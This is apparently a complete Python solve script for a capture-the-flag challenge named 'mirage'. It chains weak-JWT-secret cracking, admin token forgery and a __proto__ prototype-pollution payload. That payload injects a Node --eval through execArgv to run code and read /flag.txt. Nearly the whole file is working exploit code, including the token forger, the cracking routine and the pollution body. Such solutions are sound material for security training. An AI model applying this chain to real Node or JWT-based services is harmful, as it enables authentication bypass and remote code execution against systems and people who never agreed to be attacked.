#!/usr/bin/env python3
"""
Automated solve for 10 · mirage.

Chain (two independent bugs, both required):
  1. Sign up -> receive an HS256 JWT. The signing secret is weak; crack it offline
     (here: a small embedded wordlist; in practice `hashcat -m 16500` on rockyou).
  2. Forge a token with role:"admin" using the cracked secret -> reach the
     admin-only maintenance endpoint.
  3. As the normal user, POST to the hidden /users/<own id> a JSON body with a
     __proto__ key -> the unsafe deep-merge pollutes Object.prototype.execArgv.
  4. Trigger the maintenance job with the forged admin token. It fork()s a Node
     worker; the options bag is built by a for..in copy that materialises the
     polluted execArgv as an own property -> the child runs our --eval, which
     prints /flag.txt to stdout.
  5. The endpoint returns the worker's captured stdout as the job log -> read the
     flag straight out of the response.

Pure stdlib. Usage:  python3 solve.py [base_url]   (default http://127.0.0.1:8010)
"""
import base64
import hashlib
import hmac
import json
import re
import secrets
import sys
import time
import urllib.error
import urllib.request

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8010").rstrip("/")

# Stand-in for a cracking wordlist. The real intended path is:
#   hashcat -m 16500 token.jwt rockyou.txt      (or jwt_tool / john)
WORDLIST = [
    "password", "secret", "mirage", "admin", "changeme", "123456",
    "industrial", "portal", "operator", "turbine", "fenrir", "valhalla",
]


def b64url_decode(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def b64url_encode(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def http(method, path, data=None, token=None, raw=False):
    url = BASE + path
    headers = {}
    body = None
    if data is not None:
        body = json.dumps(data).encode()
        headers["Content-Type"] = "application/json"
    if token:
        headers["Authorization"] = "Bearer " + token
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        resp = urllib.request.urlopen(req)
        payload = resp.read()
    except urllib.error.HTTPError as e:
        payload = e.read()
        resp = e
    return (resp.status, payload if raw else _maybe_json(payload))


def _maybe_json(b):
    try:
        return json.loads(b.decode())
    except Exception:
        return b.decode(errors="replace")


def crack_hs256(token, words):
    header_b64, payload_b64, sig_b64 = token.split(".")
    signing_input = (header_b64 + "." + payload_b64).encode()
    want = b64url_decode(sig_b64)
    for w in words:
        mac = hmac.new(w.encode(), signing_input, hashlib.sha256).digest()
        if hmac.compare_digest(mac, want):
            return w
    return None


def forge_admin(secret, uid):
    header = {"alg": "HS256", "typ": "JWT"}
    now = int(time.time())
    payload = {"sub": "admin", "uid": uid, "role": "admin",
               "iat": now, "exp": now + 3600}
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = (h + "." + p).encode()
    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    return h + "." + p + "." + b64url_encode(sig)


def main():
    user = "solver_" + secrets.token_hex(3)
    pw = secrets.token_hex(6)

    # 1. sign up -> token
    status, data = http("POST", "/api/signup", {"username": user, "password": pw})
    if status != 200 or not isinstance(data, dict) or "token" not in data:
        print(f"[-] signup failed: {status} {data}")
        return 1
    token = data["token"]
    uid = data["id"]
    print(f"[+] registered {user} (uid={uid})")

    # 2. crack the HS256 secret
    secret = crack_hs256(token, WORDLIST)
    if not secret:
        print("[-] secret not in embedded wordlist (use hashcat -m 16500 + rockyou)")
        return 1
    print(f"[+] cracked JWT secret: {secret!r}")

    # 3. forge an admin token
    admin_token = forge_admin(secret, 1)
    status, _ = http("GET", "/admin/maintenance", token=admin_token)
    print(f"[+] forged admin token; GET /admin/maintenance -> {status}")
    if status != 200:
        print("[-] admin gate not open with forged token")
        return 1

    # 4. prototype pollution via our own profile merge. The payload makes the
    #    forked worker print /flag.txt to stdout, which the admin endpoint returns.
    code = "console.log(require('fs').readFileSync('/flag.txt','utf8'))"
    pp_body = {"__proto__": {"execArgv": [f"--eval={code}"]}}
    status, data = http("POST", f"/users/{uid}", pp_body, token=token)
    print(f"[+] POST /users/{uid} prototype-pollution body -> {status}")

    # 5. trigger the admin maintenance job (fork -> RCE); the flag comes back in
    #    the job log, in the same response.
    status, data = http("POST", "/admin/maintenance", {}, token=admin_token)
    log = data.get("log", "") if isinstance(data, dict) else ""
    print(f"[+] triggered maintenance job -> {status}")
    m = re.search(r"SecurinetsENIT\{[^}]+\}", log)
    if m:
        print(f"[+] FLAG: {m.group(0)}")
        return 0
    print(f"[-] no flag in job output (gadget did not fire): {data}")
    return 1


if __name__ == "__main__":
    sys.exit(main())
